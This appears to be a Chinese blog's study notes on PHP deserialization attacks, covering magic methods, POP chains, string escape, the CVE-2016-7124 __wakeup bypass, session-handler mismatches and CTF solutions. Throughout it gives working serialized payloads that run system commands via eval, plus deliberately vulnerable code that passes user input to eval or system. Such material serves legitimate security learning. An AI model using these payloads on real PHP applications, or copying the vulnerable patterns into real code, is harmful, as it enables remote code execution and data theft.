src="/../image/image-20240421161552271.png" alt="image-20240421161552271"></p><h2 id="魔术方法介绍，构造和析构"><a href="#魔术方法介绍，构造和析构" class="headerlink" title="魔术方法介绍，构造和析构"></a><strong>魔术方法介绍，构造和析构</strong></h2><p><strong>魔术方法</strong>：一个预定义好的，在特定情况下自动触发的行为方法。</p><p><strong>魔术方法的作用</strong>：</p><p>反序列化漏洞的成因:</p><p>反序列化过程中，unserialize()接收的值(字符串)可控;通过更改这个值(字符串)，得到所需要的代码，通过调用方法，触发代码执行。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="/../image/image-20240421162047664.png" alt="image-20240421162047664"></p><p>先思考触发时机，再思考功能，再想会不会传参数，然后得出返回值</p><p><img src="/../image/image-20240421162221153.png" alt="image-20240421162221153"></p><h3 id="construct-、destruct-类的构建和析构函数"><a href="#construct-、destruct-类的构建和析构函数" class="headerlink" title="construct()、destruct 类的构建和析构函数"></a>construct()、destruct 类的构建和析构函数</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);class User &#123;    public $username;    public function __construct($username) &#123;        $this-&gt;username = $username;        echo &quot;触发了构造函数1次&quot; ;    &#125;&#125;$test = new User(&quot;benben&quot;);$ser = serialize($test);unserialize($ser);?&gt;</code></pre><p><img src="/../image/image-20240421162514691.png" alt="image-20240421162514691"></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class User &#123;    public function __destruct()#在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法，在反序列化过程中会触发;    &#123;        echo &quot;触发了析构函数1次&quot;.&quot;&lt;br /&gt;&quot; ;    &#125;&#125;$test = new User(&quot;benben&quot;);$ser = serialize($test);unserialize($ser);?&gt;</code></pre><p><img src="/../image/image-20240421162659320.png" alt="image-20240421162659320"></p><p><strong>例题</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $cmd = &quot;echo &#39;dazhuang666!!&#39;;&quot; ;    public function __destruct()    &#123;        eval ($this-&gt;cmd);    &#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);?&gt;</code></pre><p>构造，让cmd&#x3D;我们想要的指令就行</p><p>O:4:”User”:1:{s:3:”cmd”;s:14:”system(‘dir’);”;}</p><p><img src="/../image/image-20240421165300585.png" alt="image-20240421165300585"></p><h3 id="weakup-、sleep方法"><a href="#weakup-、sleep方法" class="headerlink" title="weakup()、sleep方法"></a>weakup()、sleep方法</h3><p><strong>__sleep()</strong></p><p>**序列化serialize()**函数会检査类中是否存在一个魔术方法_ seep()。</p><p>如果存在，该方法会先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL被序列化，并产生一个ENOTICE级别的错误。</p><p>触发时机:序列化serialize()之前</p><p>功能:对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>参数:成员属性</p><p>返回值:需要被序列化存储的成员属性</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);class User &#123;    const SITE = &#39;uusama&#39;;    public $username;    public $nickname;    private $password;    public function __construct($username, $nickname, $password)    &#123;        $this-&gt;username = $username;        $this-&gt;nickname = $nickname;        $this-&gt;password = $password;    &#125;    public function __sleep() &#123;        return array(&#39;username&#39;, &#39;nickname&#39;);    &#125;&#125;$user = new User(&#39;a&#39;, &#39;b&#39;, &#39;c&#39;);echo serialize($user);?&gt;</code></pre><p><img src="/../image/image-20240421170502700.png" alt="image-20240421170502700"></p><p>可以发现password没有了，这是因为序列化调用了sleep，只返回了这两个值，我们把sleep注释掉看看结果。</p><p><img src="/../image/image-20240421182315566.png" alt="image-20240421182315566"></p><p>可以啊看到就有password了，且因为是private，前面还加上了类名和null</p><p><strong>例题</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#39;uusama&#39;;    public $username;    public $nickname;    private $password;    public function __construct($username, $nickname, $password)    &#123;        $this-&gt;username = $username;        $this-&gt;nickname = $nickname;        $this-&gt;password = $password;    &#125;    public function __sleep() &#123;        system($this-&gt;username);    &#125;&#125;$cmd = $_GET[&#39;benben&#39;];$user = new User($cmd, &#39;b&#39;, &#39;c&#39;);echo serialize($user);?&gt;</code></pre><p>这里直接构造参数benben&#x3D;dir即可</p><p><strong>__wakeup()</strong></p><p>和sleep相反，<strong>unserialize()</strong> 会检查是否存在一个wakeup()方法。如果存在，则会先调用，wakeup()方法，预先准备对象需要的资源。预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p><p><img src="/../image/image-20240421183347881.png" alt="image-20240421183347881"></p><p><strong>例题</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#39;uusama&#39;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        $this-&gt;password = $this-&gt;username;    &#125;&#125;$user_ser = &#39;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;a&quot;;s:8:&quot;nickname&quot;;s:1:&quot;b&quot;;&#125;&#39;;var_dump(unserialize($user_ser));?&gt;</code></pre><p><img src="/../image/image-20240421183634736.png" alt="image-20240421183634736"></p><p>可以看到本来没有赋值的password赋值了a</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#39;uusama&#39;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);    &#125;&#125;$user_ser = $_GET[&#39;benben&#39;];unserialize($user_ser);?&gt;</code></pre><p>**O:4:”User”:1:{s:8:”username”;s:3:”dir”;}**，这里不用写全，因为最后也是调用wakeup只要用username即可，这句就相当于给username赋值</p><p><img src="/../image/image-20240421184030452.png" alt="image-20240421184030452"></p><pre><code class="php">class xctf&#123;public $flag = &#39;111&#39;;public function __wakeup()&#123;exit(&#39;bad requests&#39;);&#125;?code=</code></pre><p>O:4:”xctf”:1:{s:4:”flag”:s:3:”111”;}</p><h3 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString()"></a><strong>__toString()</strong></h3><p>表达方式错误导致魔术方法触发，即把对象当成字符串 调用</p><p><strong>例子：</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;         public function __toString()         &#123;             return &#39;格式不对，输出不了!&#39;;          &#125;&#125;$test = new User() ;print_r($test);echo &quot;&lt;br /&gt;&quot;;echo $test;?&gt;</code></pre><p><img src="/../image/image-20240421185655678.png" alt="image-20240421185655678"></p><p>可以看到，在echo时，调用了toString方法。把类User实体化并赋值给$test,此时$test是个对象调用对象可以使用print_r或者var_dump如果使用echo或者print只能调用字符串的方式去调用对象即把对象当成字符串使用，此时自动触发tostring()，常用于构造POP链</p><h3 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h3><p>这个是格式方法错误导致被调用。</p><p>例子：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    var $benben = &quot;this is test!!&quot;;         public function __invoke()         &#123;             echo  &#39;它不是个函数!&#39;;          &#125;&#125;$test = new User() ;echo $test -&gt;benben;echo &quot;&lt;br /&gt;&quot;;echo $test() -&gt;benben;//这里是把他当函数调用了?&gt;</code></pre><p><img src="/../image/image-20240421190435573.png" alt="image-20240421190435573"></p><p>把类User实体化并赋值给$test为对象正常输出对象里的值benben加()是把test当成函数test()来调用,此时触发invoke()</p><h3 id="错误调用属性和方法的魔术方法"><a href="#错误调用属性和方法的魔术方法" class="headerlink" title="错误调用属性和方法的魔术方法"></a>错误调用属性和方法的魔术方法</h3><h4 id="call"><a href="#call" class="headerlink" title="__call()"></a><strong>__call()</strong></h4><p>触发时机:调用一个不存在的方法</p><p>功能:</p><p>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public function __call($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test -&gt; callxxx(&#39;a&#39;);?&gt;</code></pre><p><img src="/../image/image-20240421192042597.png" alt="image-20240421192042597"></p><p>9调用的方法callxxx()不存在，触发魔术方法call(),传参$arg1,$arg2(callxxx,a)<br>$arg1,调用的不存在的方法的名称;</p><p>$arg2,调用的不存在的方法的参数;</p><h4 id="callStatic"><a href="#callStatic" class="headerlink" title="__callStatic()"></a>__callStatic()</h4><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public function __callStatic($arg1,$arg2)    &#123;        echo &quot;$arg1,$arg2[0]&quot;;          &#125;&#125;$test = new User() ;$test::callxxx(&#39;a&#39;);?&gt;</code></pre><p><img src="/../image/image-20240421194930475.png" alt="image-20240421194930475"></p><p>触发时机:静态调用或调用成员常量时使用的方法不存在<br>参数:2个参数传参$arg1,$arg2</p><p>返回值:调用的不存在的方法的名称和参数<br> 静态调用::时的方法callxxx()不存在<br>触发callStatic()，传参$arg1,$arg2(callxxx,a)</p><h3 id="get"><a href="#get" class="headerlink" title="__get"></a>__get</h3><p>触发时机:调用的成员属性不存在</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public $var1;    public function __get($arg1)    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;$test -&gt;var2;?&gt;</code></pre><p><img src="/../image/image-20240421200603830.png" alt="image-20240421200603830"></p><h3 id="set"><a href="#set" class="headerlink" title="__set"></a>__set</h3><p>和get相对的</p><p>触发时机:给不存在的成员属性赋值</p><p>参数:传参$arg1,$arg2</p><p>返回值:不存在的成员属性的名称和赋的值</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    public $var1;    public function __set($arg1 ,$arg2)    &#123;        echo  $arg1.&#39;,&#39;.$arg2;    &#125;&#125;$test = new User() ;$test -&gt;var2=1;?&gt;</code></pre><p><img src="/../image/image-20240421200840341.png" alt="image-20240421200840341"></p><p>既要调用也要赋值</p><h3 id="isset"><a href="#isset" class="headerlink" title="__isset()"></a>__isset()</h3><p>触发时机:对不可访问属性使用 isset()或empty() 时，_isset()会被调用。</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __isset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;isset($test-&gt;var);?&gt;</code></pre><p><img src="/../image/image-20240421203616902.png" alt="image-20240421203616902"></p><p>isset()调用的成员属性var不可访问或不存在,z这里是访问了私有属性的成员</p><h3 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h3><p>触发时机:对不可访问属性使用 unset()时</p><p>参数:传参$arg1</p><p>返回值:不存在的成员属性的名称</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __unset($arg1 )    &#123;        echo  $arg1;    &#125;&#125;$test = new User() ;unset($test-&gt;var);?&gt;</code></pre><p><img src="/../image/image-20240421204951446.png" alt="image-20240421204951446"></p><p>unset()调用的成员属性var不可访问或不存在<br>触发unset()返回$arg1,不存在成员属性的名称;</p><h3 id="clone"><a href="#clone" class="headerlink" title="__clone()"></a>__clone()</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    private $var;    public function __clone( )    &#123;        echo  &quot;__clone test&quot;;          &#125;&#125;$test = new User() ;$newclass = clone($test)?&gt;</code></pre><p><img src="/../image/image-20240421205119991.png" alt="image-20240421205119991"></p><p><img src="/../image/image-20240421205133831.png" alt="image-20240421205133831"></p><h2 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);    &#125;&#125;unserialize($_GET[&#39;test&#39;]);?&gt;</code></pre><p>反推法：</p><p>利用点首先是在eval，这个是危险函数，然后eval的参数是test2，然后由action方法调用，往上找，normal类里也有个action，但不是魔术方法，不会自己调用，但可以发现index类里的destruct方法里会调用action，所以我们要给test赋值一个对象，也就是evil，所以构造时需要把test赋值成test，但前面construct也给test赋值了，但反序列化不会调用所以不管他，下面用代码构造payload</p><pre><code class="php">&lt;?php#highlight_file(__FILE__);error_reporting(0);class index&#123;    private $test;    public function __construct()    &#123;        $this-&gt;test = new evil();    &#125;&#125;class evil&#123;    var $test2 = &quot;system(&#39;dir&#39;);&quot;;    public function action()    &#123;        eval($this-&gt;test2);    &#125;&#125;echo serialize(new index());#echo urlencode(serialize(new index()))?&gt;</code></pre><p><strong>O:5:”index”:1:{s:11:”%00index%00test”;O:4:”evil”:1:{s:5:”test2”;s:14:”system(‘dir’);”;}}</strong></p><p>另一种方法,要在$test2是在public的情况下才可以用</p><pre><code class="php">&lt;?phpclass index &#123;    private $test;&#125;class evil &#123;    var $test2;&#125;$a = new evil();$a = new evil();$a-&gt;test2 = &quot;system(&#39;ipconfig&#39;);&quot;;$b = new index();$b-&gt;test=$a;echo serialize($b);?&gt;</code></pre><p><strong>魔术方法触发前提:魔术方法所在类(或对象)被调用</strong></p><p><img src="/../image/image-20240421214613496.png" alt="image-20240421214613496"></p><h3 id="wakeup"><a href="#wakeup" class="headerlink" title="__wakeup()"></a><strong>__wakeup()</strong></h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;    &#125;&#125;class sec &#123;    var $benben;    public function __toString()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#39;benben&#39;];unserialize($b);?</code></pre><p>目的是显示tosring is here!!，这就需要我们去构造一个把对象当字符串输出的例子，所以我们需要把sec()示例化成对象后当成字符串输出，在echo中的source</p><p><strong>构造</strong></p><pre><code class="php">&lt;?php##highlight_file(__FILE__);error_reporting(0);class fast&#123;    public $source;&#125;class sec&#123;    var $benben;&#125;$a = new sec();$b = new fast();$b-&gt;source = $a;echo serialize($b);?&gt;</code></pre><p><img src="/../image/image-20240421215643611.png" alt="image-20240421215643611"></p><h2 id="POP链构造和POC编写"><a href="#POP链构造和POC编写" class="headerlink" title="POP链构造和POC编写"></a>POP链构造和POC编写</h2><p>在<strong>反序列化</strong>中，我们能控制的数据就是对象中的属性值(成员变量)所以在PHP反序列化中有一种漏洞利用方法叫”面向属性编程”即POP( Property Oriented Programming).</p><p><strong>POP链</strong>就是利用魔法方法在里面进行多次跳转然后获取敏感数据的-种payload。</p><p><strong>POC</strong>(全称:Proof of concept)中文译作概念验证。在安全界可以理解成漏洞验证程序。PoC是一段不完整的程序，仅仅是为了证明提出者的观点的一段代码。</p><pre><code class="PHP">&lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;    &#125;    public function __wakeup()&#123;        echo $this-&gt;source;    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();    &#125;&#125;if(isset($_GET[&#39;pop&#39;]))&#123;    unserialize($_GET[&#39;pop&#39;]);&#125;?&gt;</code></pre><p><img src="/../image/image-20240422193805684.png" alt="image-20240422193805684"></p><p>构造代码,将上面代码复制下来，删去函数</p><pre><code class="php">&lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var=&quot;flag.php&quot;;//首先给var赋值，因为flag在flag.php里&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;//赋值完后，首先调用appen方法就需要实例化这这个类，所以我们先new一个MOdifier$a = new Modifier();//第二步触发get，给$p辅助对象Modifier，所以先new一个Test$c = new Test();$c-&gt;p = $a;//第三步触发toString，给str辅助对象Test，所以先new一个Show$b = new Show();$b-&gt;str=$c;//最后触发wakeup，给$source赋值对象Show$b-&gt;source = $b;echo serialize($b);?&gt;</code></pre><p><img src="/../image/image-20240422201116529.png" alt="image-20240422201116529"></p><h3 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h3><p><strong>反席列化分隔符</strong></p><p>反序列化以**;}**结束，后面的字符串不影响正常的反序列化</p><p><strong>属性逃逸</strong></p><p>一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串<strong>变多</strong>或者<strong>变少</strong>的时候有可能存在反序列化属性逃逸。</p><p><img src="/../image/image-20240422203155467.png" alt="image-20240422203155467"></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class A&#123;    public $v1 = &quot;abcsystem()system()system()&quot;;    public $v2 = &#39;123&#39;;    public function __construct($arga,$argc)&#123;            $this-&gt;v1 = $arga;            $this-&gt;v2 = $argc;    &#125;&#125;$a = $_GET[&#39;v1&#39;];$b = $_GET[&#39;v2&#39;];$data = serialize(new A($a,$b));$data = str_replace(&quot;system()&quot;,&quot;&quot;,$data);var_dump(unserialize($data));?&gt;</code></pre><p><img src="/../image/image-20240422203552916.png" alt="image-20240422203552916"></p><p><img src="/../image/image-20240422203729881.png" alt="image-20240422203729881"></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);class A&#123;    public $v1 = &#39;ls&#39;;    public $v2 = &#39;123&#39;;    public function __construct($arga,$argc)&#123;        $this-&gt;v1 = $arga;        $this-&gt;v2 = $argc;    &#125;&#125;$a = $_GET[&#39;v1&#39;];$b = $_GET[&#39;v2&#39;];$data =  serialize(new A($a,$b));$data = str_replace(&quot;ls&quot;,&quot;pwd&quot;,$data);var_dump(unserialize($data));</code></pre><p><img src="/../image/image-20240422204912778.png" alt="image-20240422204912778"></p><p><img src="/../image/image-20240422205523284.png" alt="image-20240422205523284"></p><p>例题：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name)&#123;    $safe=array(&quot;flag&quot;,&quot;php&quot;);    $name=str_replace($safe,&quot;hack&quot;,$name);    return $name;&#125;class test&#123;    var $user;    var $pass=&#39;daydream&#39;;    function __construct($user)&#123;        $this-&gt;user=$user;    &#125;&#125;$param=$_GET[&#39;param&#39;];$param=serialize(new test($param));$profile=unserialize(filter($param));if ($profile-&gt;pass==&#39;escaping&#39;)&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;</code></pre><p><img src="/../image/image-20240422210042900.png" alt="image-20240422210042900"></p><pre><code class="php">&lt;?phpclass test&#123;    var $user = &quot;benben&quot;;    var $pass = &quot;escaping&quot;;&#125;echo serialize(new test());</code></pre><p>O:4:”test”:2:{s:4:”user”;s:6:”benben**”;s:4:”pass”;s:8:”escaping”;}**</p><p>加粗部分就是要逃逸的代码,$user是可以控制的，加粗部分一共29个字符，然后一个php吐出一个字符</p><p><img src="/../image/image-20240422210527195.png" alt="image-20240422210527195"></p><p>所以我们需要写29个php，所以</p><pre><code class="php">$param=&#39;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&quot;;s:4:&quot;pass&quot;;s:8:&quot;escaping&quot;;&#125;&#39;</code></pre><p><img src="/../image/image-20240422211453318.png" alt="image-20240422211453318"></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($name)&#123;    $safe=array(&quot;flag&quot;,&quot;php&quot;);    $name=str_replace($safe,&quot;hk&quot;,$name);    return $name;&#125;class test&#123;    var $user;    var $pass;    var $vip = false ;    function __construct($user,$pass)&#123;        $this-&gt;user=$user;    $this-&gt;pass=$pass;    &#125;&#125;$param=$_GET[&#39;user&#39;];$pass=$_GET[&#39;pass&#39;];$param=serialize(new test($param,$pass));$profile=unserialize(filter($param));if ($profile-&gt;vip)&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;</code></pre><p><img src="/../image/image-20240422211955099.png" alt="image-20240422211955099"></p><pre><code class="php">&lt;?phpclass test&#123;    var $user = &quot;flag&quot;;    var $pass = &quot;benben&quot;;    var $vip = true;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:4:&quot;flag&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;</code></pre><p><img src="/../image/image-20240422212341637.png" alt="image-20240422212341637"></p><p><img src="/../image/image-20240422212356828.png" alt="image-20240422212356828"></p><p>user&#x3D;flagflagflagflagflagflagflagflagflagflag</p><p>pass&#x3D;1”;s:4:”pass”;s:6:”benben”;s:3:”vip”;b:1;}</p><p><img src="/../image/image-20240422212509444.png" alt="image-20240422212509444"></p><h2 id="wakeup-绕过-反序列化漏洞-CVE-2016-7124"><a href="#wakeup-绕过-反序列化漏洞-CVE-2016-7124" class="headerlink" title="__wakeup()绕过 反序列化漏洞:CVE-2016-7124"></a>__wakeup()绕过 反序列化漏洞:CVE-2016-7124</h2><p>PHP5&lt;5.6.25</p><p>PHP7&lt;7.0.10</p><p>漏洞产生原因:如果存在_wakeup方法，调用unserilize()方法前则先调用_wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时，会跳过wakeup()的执行</p><p><img src="/../image/image-20240422213907834.png" alt="image-20240422213907834"></p><pre><code class="php">&lt;?phperror_reporting(0);class secret&#123;    var $file=&#39;index.php&#39;;    public function __construct($file)&#123;        $this-&gt;file=$file;    &#125;    function __destruct()&#123;        include_once($this-&gt;file);        echo $flag;    &#125;    function __wakeup()&#123;        $this-&gt;file=&#39;index.php&#39;;    &#125;&#125;$cmd=$_GET[&#39;cmd&#39;];if (!isset($cmd))&#123;    highlight_file(__FILE__);&#125;else&#123;    if (preg_match(&#39;/[oc]:\d+:/i&#39;,$cmd))&#123;        echo &quot;Are you daydreaming?&quot;;    &#125;    else&#123;        unserialize($cmd);    &#125;&#125;//sercet in flag.php?&gt;</code></pre><p><img src="/../image/image-20240422214302481.png" alt="image-20240422214302481"></p><p><img src="/../image/image-20240422214345007.png" alt="image-20240422214345007"></p><p><img src="/../image/image-20240422214428123.png" alt="image-20240422214428123"></p><pre><code class="php">&lt;?phpclass secret&#123;    var $file = &quot;flag.php&quot;;&#125;#echo serialize(new secret());#O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;+号绕过过滤，2绕过wakeup$a = &#39;O:+6:&quot;secret&quot;:2:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;&#39;;echo urlencode($a);</code></pre><p><img src="/../image/image-20240422214911144.png" alt="image-20240422214911144"></p><h3 id="攻防世界Web-php-unserialize"><a href="#攻防世界Web-php-unserialize" class="headerlink" title="攻防世界Web_php_unserialize"></a>攻防世界Web_php_unserialize</h3><pre><code class="php">&lt;?php class Demo &#123;     private $file = &#39;index.php&#39;;    public function __construct($file) &#123;         $this-&gt;file = $file;     &#125;    function __destruct() &#123;         echo @highlight_file($this-&gt;file, true);     &#125;    function __wakeup() &#123;         if ($this-&gt;file != &#39;index.php&#39;) &#123;             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         &#125;     &#125; &#125;if (isset($_GET[&#39;var&#39;])) &#123;     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123;         die(&#39;stop hacking!&#39;);     &#125; else &#123;        @unserialize($var);     &#125; &#125; else &#123;     highlight_file(&quot;index.php&quot;); &#125; ?&gt;</code></pre><p>构造</p><pre><code class="php">&lt;?phpclass Demo&#123;    private $file = &#39;fl4g.php&#39;;&#125;$a = serialize(new Demo());#O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;$a = str_replace(&#39;O:4&#39;, &#39;O:+4&#39;, $a);      //绕过正则表达式过滤$a = str_replace(&#39;:1:&#39;, &#39;:2:&#39;, $a);#echo urlencode($a);#O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D$b = &#39;O%3A%2B4%3A%22Demo%22%3A2%3A%7Bs%3A10%3A%22%2500Demo%2500file%22%3Bs%3A8%3A%22f14g.php%22%3B%7D&#39;;#$a = &#39;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot;%00Demo%00file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#39;;echo base64_encode($a);# base64_encode()?&gt;</code></pre><p><img src="/../image/image-20240422220359368.png" alt="image-20240422220359368"></p><p>要注意的是，自己换空值好像不行，得保存后得字符串才行。</p><h3 id="引用的利用方式"><a href="#引用的利用方式" class="headerlink" title="引用的利用方式"></a>引用的利用方式</h3><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);class just4fun &#123;    var $enter;    var $secret;&#125;if (isset($_GET[&#39;pass&#39;])) &#123;    $pass = $_GET[&#39;pass&#39;];    $pass=str_replace(&#39;*&#39;,&#39;\*&#39;,$pass);&#125;$o = unserialize($pass);if ($o) &#123;    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)#===表示        echo &quot;Congratulation! Here is my secret: &quot;.$flag;    else        echo &quot;Oh no... You can&#39;t fool me&quot;;&#125;else echo &quot;are you trolling?&quot;;?&gt;</code></pre><p><img src="/../image/image-20240422223643678.png" alt="image-20240422223643678"></p><pre><code class="php">&lt;?phpclass just4fun&#123;    var $enter;    var $secret;&#125;$a = new just4fun();$a-&gt;enter =&amp; $a-&gt;secret;#有点类似指向同一地址echo serialize($a);#O:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125;</code></pre><p><img src="/../image/image-20240422223947695.png" alt="image-20240422223947695"></p><h1 id="session反序列化"><a href="#session反序列化" class="headerlink" title="session反序列化"></a>session反序列化</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>当session start()被调用或者php.ini中session.auto start为1时PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录(默认为&#x2F;tmp)<br><strong>存取数据的格式有多种，常用的有三种：</strong></p><table><thead><tr><th>处理器</th><th>对应得存储格式</th></tr></thead><tbody><tr><td>php</td><td>键名+竖线+经过serialize()函数序列化处理得值</td></tr><tr><td>php_serialize(php&gt;&#x3D;5.5.4)</td><td>经过序列化处理得数组</td></tr><tr><td>php_binary</td><td>键名长度对应得ASCII字符+键名+经过反序列化处理得值</td></tr></tbody></table><p><strong>漏洞产生:写入格式和读取格式不一致</strong></p><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);session_start();$_SESSION[&#39;benben&#39;] = $_GET[&#39;ben&#39;];?&gt;</code></pre><p><img src="/../image/image-20240423132729023.png" alt="image-20240423132729023"></p><p><img src="/../image/image-20240423133002797.png" alt="image-20240423133002797"></p><p><img src="/../image/image-20240423153656983.png" alt="image-20240423153656983"></p><p><img src="/../image/image-20240423153729988.png" alt="image-20240423153729988"></p><pre><code class="php">&lt;?php highlight_file(__FILE__);error_reporting(0);ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);session_start();class D&#123;    var $a;    function __destruct()&#123;        eval($this-&gt;a);    &#125;&#125;?&gt;</code></pre><pre><code class="php">&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);session_start();$_SESSION[&#39;ben&#39;] = $_GET[&#39;a&#39;];?&gt;</code></pre><p><img src="/../image/image-20240423155140220.png" alt="image-20240423155140220"></p><p><strong>构造</strong>,关键是一个页面写入，另一个页面会读取</p><pre><code class="php">&lt;?phpclass D&#123;    var $a = &#39;system(&quot;dir&quot;)&#39;;&#125;echo serialize(new D());#O:1:&quot;D&quot;:1:&#123;s:1:&quot;a&quot;;s:13:&quot;system(&quot;dir&quot;)&quot;;&#125;记得+上|</code></pre><p><img src="/../image/image-20240423155441641.png" alt="image-20240423155441641"></p><p>例题</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);/*hint.php*/#线索session_start();class Flag&#123;    public $name;    public $her;    function __wakeup()&#123;        $this-&gt;her=md5(rand(1, 10000));        if ($this-&gt;name===$this-&gt;her)&#123;            include(&#39;flag.php&#39;);            echo $flag;        &#125;    &#125;&#125;?&gt;</code></pre><pre><code class="php">/*hint.php*/&lt;?phphighlight_file(__FILE__);error_reporting(0);ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);session_start();$_SESSION[&#39;a&#39;] = $_GET[&#39;a&#39;];?&gt;</code></pre><p>要用到引用的知识</p><pre><code class="php">&lt;?php    class Flag&#123;    public $name;    public $her;&#125;$a = new Flag();$a-&gt;name =&amp; $a-&gt;her;echo serialize($a);?&gt;    #O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</code></pre><p><img src="/../image/image-20240423160332991.png" 